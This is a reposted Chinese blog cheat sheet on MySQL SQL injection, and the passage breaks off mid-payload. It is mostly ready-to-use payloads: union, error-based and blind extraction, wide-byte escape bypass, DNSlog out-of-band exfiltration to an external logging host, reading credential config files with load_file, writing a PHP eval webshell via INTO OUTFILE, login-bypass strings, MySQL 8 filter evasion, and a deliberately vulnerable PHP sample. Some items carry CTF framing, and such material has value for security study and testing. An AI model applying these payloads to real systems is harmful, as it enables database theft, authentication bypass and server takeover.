    <content type="html"><![CDATA[<h1 id="SQL注入手册【转】">SQL注入手册【转】</h1><blockquote><p>来自https://northity.com/2019/03/02/Sql%E6%B3%A8%E5%85%A5%E6%89%8B%E5%86%8C</p></blockquote><h2 id="常见数据库搭配">常见数据库搭配</h2><ul><li>ASP + ACCESS + IIS</li><li><a href="http://ASP.NET">ASP.NET</a> + MSSQL +IIS</li><li>PHP + Mysql + Apache(Nginx)</li><li>JSP + Oracle(Mysql) + Tomcat</li></ul><p>目前来讲就遇到过这些常见组合，快速判断数据库类型是注入的第一步</p><h2 id="Mysql">Mysql</h2><h3 id="基础">基础</h3><h4 id="数据库名">数据库名</h4><ul><li><p>database()</p></li><li><p>schema()</p></li></ul><h4 id="当前登陆用户">当前登陆用户</h4><ul><li><p>USER()</p></li><li><p>CURRENT_USER()</p></li><li><p>SYSTEM_USER()</p></li><li><p>SESSION_USER()</p></li></ul><h4 id="数据库版本">数据库版本</h4><ul><li><p>VERSION()</p></li><li><p>@@VERSION</p></li><li><p>@@GLOBAL.VERSION</p></li></ul><h4 id="路径相关">路径相关</h4><ul><li><p>@@BASEDIR : mysql安装路径</p></li><li><p>@@SLAVE_LOAD_TMPDIR : 临时文件夹路径</p></li><li><p>@@DATADIR : 数据存储路径</p></li><li><p>@@CHARACTER_SETS_DIR : 字符集设置文件路径</p></li><li><p>@@LOG_ERROR : 错误日志文件路径</p></li><li><p>@@PID_FILE : pid-file文件路径</p></li><li><p>@@BASEDIR : mysql安装路径</p></li><li><p>@@SLAVE_LOAD_TMPDIR : 临时文件夹路径</p></li></ul><h4 id="字符串连接">字符串连接</h4><ul><li>concat(str1,str2) //将字符串首尾相连</li><li>concat_ws(separator,str1,str2) //将字符串用指定连接符连接</li><li>group_concat()//</li></ul><h4 id="字符截断">字符截断</h4><ul><li>left(str,index) //从左边第index开始截取</li><li>right(str,index) //从右边第index开始截取</li><li>substring(str,index) //从左边index开始截取</li><li>substr(str,index,len) //截取str,index开始,截取len的长度</li><li>mid(str,index,ken) //截取str 从index开始,截取len的长度</li></ul><h4 id="字符串比较函数">字符串比较函数</h4><ul><li>strcmp(expr1,expr2)//如果两个字符串是一样则返回0,如果第一个小于第二个则返回-1</li><li>find_in_set(str,strlist) //如果相同则返回1不同则返回0</li></ul><h4 id="注释">注释</h4><ul><li><p>–(后面还有个空格)</p></li><li><p># 单行注释符，url编码为%23</p></li><li><p>/*…*/</p></li><li><p>/! 语句 / 语句会被执行 可用做分割</p></li></ul><h4 id="运算符">运算符</h4><p>比较运算符</p><ul><li><p>=</p></li><li><p>&gt;</p></li><li><p>&lt;</p></li><li><p>!=</p></li><li><p>&lt;&gt; 不等于的意思</p></li><li><p>like (模糊匹配 <code>select '12345' like '12%' =&gt; true</code>)</p></li><li><p>in（<code>select '123' in ('12') =&gt; false</code>）</p></li><li><p>between (<code>select database() between 0x61 and 0x7a;//select database() between 'a' and 'z';</code>)</p></li><li><p>regexp / rlike(正则匹配<code>select '123455' regexp '^12' =&gt; true</code>)</p></li></ul><p>算术运算符</p><ul><li><ul><li></li></ul></li><li>-</li><li><ul><li></li></ul></li><li>/</li></ul><p>逻辑运算符</p><ul><li>not / ！</li><li>and / &amp;&amp;</li><li>or / ||</li><li>xor / ^</li></ul><p>位运算符</p><ul><li>&amp; 按位与</li><li>| 按位或</li><li>^ 按位异或</li><li>! 取反</li><li>&lt;&lt; 左移</li><li>&gt;&gt;右移</li></ul><h4 id="绕过函数">绕过函数</h4><ul><li>instr(str1,substr) //从子字符串中返回子串第一次出现的位置</li><li>lpad(str,len,padstr) rpad(str,len,padstr) // 在str的左(右)两边填充给定的padstr到指定的长度len,返回填充的结果</li></ul><h4 id="延时函数">延时函数</h4><ul><li>sleep()</li><li>benchmark(1000000,sha(1))</li></ul><h4 id="编码函数">编码函数</h4><ul><li>hex()</li><li>ascii()</li></ul><h4 id="文件函数">文件函数</h4><ul><li>load_file() //读文件路径可以用0x，char转换的字符</li><li>outfile <code>select * into outfile '/tmp/test.txt'</code></li><li>dumpfile //用法同上但是只能写入一行数据，常用于udf提权写dll</li></ul><h3 id="构造语句">构造语句</h3><h4 id="条件语句">条件语句</h4><ul><li><code>if(expr1,expr2,expr3)</code> // expr1 true执行expr2否则执行expr3</li><li><code>select case when (条件) then 代码1 else 代码 2 end</code></li></ul><h4 id="information-schema-结构">information_schema 结构</h4><ul><li>information_schema.tables:<br>查询表名:table_name 对应的数据库名: table_schema</li><li>information_schema.columns:<br>查询列名:column_name 对应的表名:table_schemam</li></ul><h4 id="Mysql注入语句一般形式">Mysql注入语句一般形式</h4><ul><li>联合 <code>构造联合语句 + 查询结果</code></li><li>盲注 <code>查询结果 + 比较运算符 + 猜测值</code></li><li>报错 <code>构造报错语句 + 查询结果</code></li></ul><h4 id="Mysql空白字符">Mysql空白字符</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%20 %09 %0a %0b %0c %0d %a0 &#x2F;**&#x2F; tab</span><br><span class="line">%a0 这个不会被php的\s进行匹配</span><br><span class="line">&#x2F;*!*&#x2F; 内敛注释 #这个也可以用来做分隔</span><br></pre></td></tr></table></figure><p>函数名和括号直接可以插入特殊字符 ex</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">concat&#x2F;**&#x2F;()</span><br><span class="line"></span><br><span class="line">information_schema&#x2F;**&#x2F;.&#x2F;**&#x2F;TABLES</span><br><span class="line"></span><br><span class="line">information_schema%0a.%0aTABLES</span><br></pre></td></tr></table></figure><h3 id="判断注入是否存在">判断注入是否存在</h3><p>数值型注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1+1</span><br><span class="line">?id&#x3D;-1 or 1&#x3D;1</span><br><span class="line">?id&#x3D;-1 or 10-2&#x3D;8</span><br><span class="line">?id&#x3D;1 and 1&#x3D;2</span><br><span class="line">?id&#x3D;1 and 1&#x3D;1</span><br></pre></td></tr></table></figure><p>字符型注入<br>参数被引号包围，所以需要闭合引号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;</span><br><span class="line">?id&#x3D;1&quot;</span><br><span class="line">?id&#x3D;1&#39; and &#39;1&#39;&#x3D;&#39;1</span><br><span class="line">?id&#x3D;1&quot; and &quot;1&quot;&#x3D;&quot;1</span><br></pre></td></tr></table></figure><p>闭合后构造语句再注释后面</p><h3 id="四大基本注入类型">四大基本注入类型</h3><h4 id="UNION注入">UNION注入</h4><p>最简单的注入</p><p>用UNION SELECT注入时，若后面要注出的数据的列与原数据列数不同，则会失败。所以需要先猜解列数。</p><p><strong>ORDER BY</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ORDER BY 10 #</span><br><span class="line">ORDER BY 5  #</span><br><span class="line">ORDER BY 2  #</span><br></pre></td></tr></table></figure><p>当ORDER BY的数字大于列数时会返回异常，反复测试，定位出正确的列数</p><p><strong>UNION SELECT</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UNION SELECT 1,2,3 #</span><br><span class="line">UNION ALL SELECT 1,2,3 #</span><br><span class="line">UNION ALL SELECT null,null,null #</span><br></pre></td></tr></table></figure><p><strong>数据库查询</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT GROUP_CONCAT(SCHEMA_NAME) FROM information_schema.SCHEMATA</span><br><span class="line">SELECT DATABASE()  </span><br><span class="line">SELECT schema()</span><br></pre></td></tr></table></figure><p><strong>表查询</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT GROUP_CONCAT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA&#x3D;DATABASE()</span><br><span class="line">SELECT GROUP_CONCAT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA&#x3D;0xffffff</span><br></pre></td></tr></table></figure><p><strong>字段查询</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT GROUP_CONCAT(column_name) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME&#x3D;0xffffff</span><br></pre></td></tr></table></figure><p><strong>数据获取</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT GROUP_CONCAT(column_1,column_2) FROM databasename.tablename</span><br><span class="line">SELECT GROUP_CONCAT(column_1,column_2) FROM tablename  </span><br><span class="line">SELECT * FROM tablename</span><br></pre></td></tr></table></figure><h4 id="报错注入">报错注入</h4><p><strong>常见报错payload</strong></p><ul><li><p>floor()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from(select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure></li><li><p>updatexml() <a href="//5.1.5">//5.1.5</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;(updatexml(1,concat(0x3a,(select user())),1))</span><br></pre></td></tr></table></figure></li><li><p>extractvalue() <a href="//5.1.5">//5.1.5</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1,concat(0x5c,(select user())))</span><br></pre></td></tr></table></figure></li><li><p>exp() <a href="//5.5.xn--5-bs6a4sito1pkfo13kbusp3f">//5.5.5版本之后可以使用</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select host from user where user &#x3D; &#39;root&#39; and Exp(~(select * from (select version())a));</span><br></pre></td></tr></table></figure></li><li><p>name_const //支持老版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from (select NAME_CONST(version(),0),NAME_CONST(version(),0))x;</span><br></pre></td></tr></table></figure></li><li><p>geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring() 几何函数报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select multipoint((select * from (select * from (select * from (select version())a)b)c));</span><br></pre></td></tr></table></figure></li></ul><h4 id="布尔盲注">布尔盲注</h4><p><strong>常用payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; OR (SELECT ASCII(SUBSTR(DATABASE(),i,1) ) &lt; j) #</span><br></pre></td></tr></table></figure><h4 id="时间盲注">时间盲注</h4><p><strong>常用payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UNION SELECT IF(SUBSTR((SELECT GROUP_CONCAT(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) &lt; j,BENCHMARK(100000,SHA1(1)),0)</span><br><span class="line">UNION SELECT IF(SUBSTR((SELECT GROUP_CONCAT(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) &lt; j,SLEEP(10),0)</span><br></pre></td></tr></table></figure><p>本质是if做判断然后是否执行sleep，再有回显的bool盲注中则不写延时语句，用0或者1代替</p><p>即查询结果有没有输出到页面是两者的本质区别，没有输出时才是时间盲注</p><p>除开最常见的sleep延时，还有以下姿势</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select benchmark(10000000,sha(1));</span><br></pre></td></tr></table></figure><p><strong>比赛姿势</strong></p><ul><li><p>笛卡尔积</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;</span><br><span class="line">+------------+</span><br><span class="line">| count(*)   |</span><br><span class="line">+------------+</span><br><span class="line">| 2651020120 |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (1 min 51.05 sec)</span><br></pre></td></tr></table></figure></li></ul><p>这种方法又叫做heavy query，可以通过选定一个大表来做笛卡儿积，但这种方式执行时间会几何倍数的提升，在站比较大的情况下会造成几何倍数的效果，实际利用起来非常不好用。</p><ul><li>GET_LOCK</li></ul><p>是pwnhub的一道题目<br>利用场景是有条件限制的：需要提供长连接。在Apache+PHP搭建的环境中需要使用 mysql_pconnect函数来连接数据库。<br>太少用到不赘述了<br><a href="https://zhuanlan.zhihu.com/p/35245598">https://zhuanlan.zhihu.com/p/35245598</a></p><ul><li>RLIKE</li></ul><p>通过rpad或repeat构造长字符串，加以计算量大的pattern，通过repeat的参数可以控制延时长短。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select rpad(&#39;a&#39;,4999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;);</span><br><span class="line">+-------------------------------------------------------------+</span><br><span class="line">| rpad(&#39;a&#39;,4999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;) |</span><br><span class="line">+-------------------------------------------------------------+</span><br><span class="line">|                                                           0 |</span><br><span class="line">+-------------------------------------------------------------+</span><br><span class="line">1 row in set (5.27 sec)</span><br></pre></td></tr></table></figure><h3 id="Mysql注入杂技">Mysql注入杂技</h3><h4 id="insert-update-delete注入">insert/update/delete注入</h4><p>这三类语句中可以报错注出数据，但我要写的是如何没有报错的情况下注出数据<br>本质是在闭合语句后通过子查询进行注入，通常为盲注</p><h5 id="update">update</h5><p>一段我在实战中遇到的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$result&#x3D;mysql_query(&quot;update ly set content&#x3D;&#39;$content&#39;,hf_content&#x3D;&#39;$hf_content&#39;,modi_date&#x3D;&#39;$modi_date&#39; where ly_id&#x3D;&#39;$ly_id&#39; &quot;);</span><br><span class="line">if(mysql_affected_rows())</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;&#123;\&quot;success\&quot;:true,\&quot;msg\&quot;:\&quot;回复成功!\&quot;&#125;&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line">    echo &quot;&#123;\&quot;success\&quot;:false,\&quot;msg\&quot;:\&quot;回复失败!\&quot;&#125;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>set 和 where 处都可以注入<br>建议在where处进行注入</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and sleep(1) %23</span><br></pre></td></tr></table></figure><p>但是有不少的坑点，因为是根据mysql_affected_rows()判断来进行回显的，所以在update相同的值是并不会affected rows的，但是语句是可以执行的</p><p>但是字符型又有另一个坑点<br>字符型在与数字进行与逻辑运算时会当被做0来处理，所以无法执行and后的sleep。<br>所以我们只能用 <code>or</code>,<code>||</code>,<code>xor</code>,<code>^</code></p><p>但是或逻辑运算中同样存在问题</p><p>（但是具体好像还和mysql版本有关，因为看别人blog字符+or也执行成功了，但是先先不填坑了）<br>测试只有字符为0时才会执行or后的sleep</p><p>应该是和逻辑运算的方式有关，或运算会先检验前面是否为真，只有当前面为字符0时才为假，这是和与运算的不同之处</p><p>异或的坑点和或相似<br>当字符不为数字时不会执行，具体深层原因先留坑吧</p><p>这里还有坑…</p><p>or活着xor都可能导致多次sleep，因为每次检索都会or一次<br>实战中要尽量避免这个问题，能布尔盲注的时候就不要用sleep了<br>要避免这个问题就要用与逻辑且前面为真，放到where就是前面必须where一个存在的值</p><p>测试mysql版本5.3.72</p><h5 id="insert-delete">insert/delete</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into users values (1,&#39;&#123;injecthere&#125;&#39;,&#39;password&#39;);</span><br></pre></td></tr></table></figure><p>类似update，不赘述了</p><h4 id="Order-by注入">Order by注入</h4><p>本质仍然是盲注，根据order by 0 或者 1 返回不同的排序进行注入<br>ctf中的进阶形式为order by 一个特定字段<br>比如hctf中的一道题目</p><h4 id="宽字节注入">宽字节注入</h4><p><strong>原理</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">mysql_query(&quot;SET NAMES &#39;gbk&#39;&quot;);</span><br><span class="line">....</span><br><span class="line">$name &#x3D; isset($_GET[&#39;name&#39;]) ? addslashes($_GET[&#39;name&#39;]) : 1;</span><br><span class="line">$sql &#x3D; &quot;SELECT * FROM test WHERE names&#x3D;&#39;&#123;$name&#125;&#39;&quot;;</span><br></pre></td></tr></table></figure><p>即服务器使用了款字节编码，addslashes会将单引号转义，变为\‘,而宽子节会把两个字符编码为一个汉字，所以如果拼接%df，那%df%5c就会被编码为運字，从而逃逸出转义。</p><p>具体拼接什么要根据数据库使用的编码来决定，可以去查编码表。</p><p>常见payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1%df&#39; #</span><br></pre></td></tr></table></figure><h4 id="Mysql约束攻击">Mysql约束攻击</h4><p><strong>原理</strong><br>主要两个点</p><ul><li>mysql的select查询进行字符串比较的时候,不同长度的字符串,会用空格填充到相同字符在比较。</li><li>mysql插入数据的时候,当数据超过定义的长度会出现截断象限</li></ul><p>利用方式即注册一’admin     a’用户(中间空格超长截断)，达到超长截断的目的，往数据库中写入一个’admin   ’用户，而在select的过程中’admin ‘是与’admin’相等的</p><p>所以就可以用’admin ‘的密码登陆’admin’</p><h4 id="二次注入">二次注入</h4><p>所谓二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。</p><p>二次注入是sql注入的一种，但是比普通sql注入利用更加困难，利用门槛更高。普通注入数据直接进入到 SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到 SQL 查询。</p><p>二次注入的原理，在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身还是脏数据。</p><p>在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。</p><p>这个。。只能具体情况分析了，不太好写</p><p>比如sql lab-24</p><h4 id="Mysql带外注入">Mysql带外注入</h4><p>带外通道攻击主要是利用其他协议或者渠道从服务器提取数据<br>它可能是HTTP（S）请求，DNS解析服务，SMB服务，Mail服务等</p><h5 id="DNSlog">DNSlog</h5><p>只能用于windows环境</p><p>select拼接一个UNC路径导致请求发起<br>UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。<br>其实我们平常在Widnows中用共享文件的时候就会用到这种网络地址的形式</p><p>\<a href="http://sss.xxx">sss.xxx</a>\test\</p><p>常见payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&#39;\\\\&#39;,select hex(version()),&#39;.dnslog地址&#39;)</span><br></pre></td></tr></table></figure><p>这也就解释了为什么CONCAT()函数拼接了4个\了，因为转义的原因，4个\就变成了2个\，目的就是利用UNC路径</p><p>可以直接直接用ceye.io这个平台，这个平台就集成了Dnslog的功能</p><p>利用方法</p><p>首先查看变量确定权限<br>show variables like ‘%secure%’</p><ul><li>当secure_file_priv为空，就可以读取磁盘的目录。</li><li>当secure_file_priv为G:\，就可以读取G盘的文件。</li><li>当secure_file_priv为null，load_file就不能加载文件。</li></ul><p>在mysql 5.5.34版本默认为空可以加载文件 但是之后版本为NULL会禁用函数但是<br>可以通过mysql的配置文件my.ini添加行进行配置</p><p>最好进行加密处理，防止特殊字符导致传输失败<br>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(concat(0x5c5c5c5c,select hex(version()),0x2E66326362386131382E646E736C6F672E6C696E6B2F2F616263));</span><br></pre></td></tr></table></figure><h4 id="文件读写">文件读写</h4><p>查询用户读写权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT file_priv FROM mysql.user WHERE user &#x3D; &#39;username&#39;;</span><br></pre></td></tr></table></figure><ul><li>load_file()</li></ul><p>需要有读取文件的权限<br>需要知道文件的绝对物理路径<br>要读取的文件大小必须小于 max_allowed_packet</p><p>一般没啥问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT @@max_allowed_packet;</span><br></pre></td></tr></table></figure><p>一般用load_file来看config.php（即mysql的密码）,apache配置、servu密码等。前提是要知道物理路径。</p><p>常见paylaod</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UNION SELECT LOAD_FILE(&quot;C:&#x2F;&#x2F;TEST.txt&quot;) #</span><br><span class="line">UNION SELECT LOAD_FILE(&quot;C:&#x2F;TEST.txt&quot;) #</span><br><span class="line">UNION SELECT LOAD_FILE(&quot;C:\\TEST.txt&quot;) #</span><br></pre></td></tr></table></figure><p>后面的路径可以是单引号、0x、char转换的字符<br>路径中的斜杠是/而不是\</p><p>使用编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UNION SELECT LOAD_FILE(CHAR(67,58,92,92,84,69,83,84,46,116,120,116)) #</span><br><span class="line">UNION SELECT LOAD_FILE(0x433a5c5c544553542e747874) #</span><br></pre></td></tr></table></figure><ul><li>out_file()</li></ul><p>outfile后面不能接0x开头或者char转换以后的路径，只能是单引号路径<br>经典一句话payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;&lt;?php eval($_POST[cmd])?&gt;&#39; into outfile &#39;C:&#x2F;www&#x2F;shell.php&#39;</span><br></pre></td></tr></table></figure><p>当然也可以从表中选数据写</p><h4 id="万能密码">万能密码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">admin’ —</span><br><span class="line">admin’ #</span><br><span class="line">admin’&#x2F;*</span><br><span class="line">or ‘&#x3D;’ or</span><br><span class="line">‘ or 1&#x3D;1—</span><br><span class="line">‘ or 1&#x3D;1#</span><br><span class="line">‘ or 1&#x3D;1&#x2F;*</span><br><span class="line">‘) or ‘1’&#x3D;’1—</span><br><span class="line">‘) or (‘1’&#x3D;’1—</span><br></pre></td></tr></table></figure><h2 id="UPDATE">UPDATE</h2><h3 id="利用MySQL8新特性绕过select过滤">利用MySQL8新特性绕过select过滤</h3><p>在MySQL 8.0.19之后，MySQL推出几种新语法：</p><ul><li><strong>TABLE statement</strong> - 列出表中全部内容</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; TABLE user;</span><br><span class="line">+----+----------+---------+</span><br><span class="line">| id | username | passwd  |</span><br><span class="line">+----+----------+---------+</span><br><span class="line">|  1 | admin    | adminpw |</span><br><span class="line">|  2 | tom      | tompw   |</span><br><span class="line">|  3 | kak      | kakpw   |</span><br><span class="line">+----+----------+---------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><ul><li><strong>VALUES statement</strong> - 列出一行的值</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; VALUES ROW(1, 2, 3) UNION SELECT * FROM user;</span><br><span class="line">+----------+----------+----------+</span><br><span class="line">| column_0 | column_1 | column_2 |</span><br><span class="line">+----------+----------+----------+</span><br><span class="line">|        1 | 2        | 3        |</span><br><span class="line">|        1 | admin    | adminpw  |</span><br><span class="line">|        2 | tom      | tompw    |</span><br><span class="line">|        3 | kak      | kakpw    |</span><br><span class="line">+----------+----------+----------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>假设以下代码是在过滤select, handler以及禁用堆叠注入的情景下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_GET[<span class="string">&#x27;showme&#x27;</span>]))</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"> </span><br><span class="line">$aaa = mysqli_connect(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;rootroot&#x27;</span>, <span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_GET[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">    $id = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    $id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"> </span><br><span class="line">$clean = strtolower($id);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (strpos($clean, <span class="string">&#x27;select&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;waf&#x27;</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">var_dump(<span class="string">&quot;select * from news where <span class="subst">$id</span>=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>);</span><br><span class="line">$result = mysqli_query($aaa, <span class="string">&quot;select * from news where id =&#x27;<span class="subst">$id</span>&#x27;&quot;</span>);</span><br><span class="line">$row = mysqli_fetch_array($result);</span><br><span class="line">$title = $row[<span class="string">&#x27;title&#x27;</span>];</span><br><span class="line">$content = $row[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;<span class="subst">$title</span>&lt;/h1&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;<span class="subst">$content</span>&lt;/h2&gt;&lt;br&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><p>构造恶意sql语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from news where $id&#x3D;&#39;&#39; or (1,&#39;admin&#39;,&#39;&#123;passwd&#125;&#39;) &lt;&#x3D; (table user limit 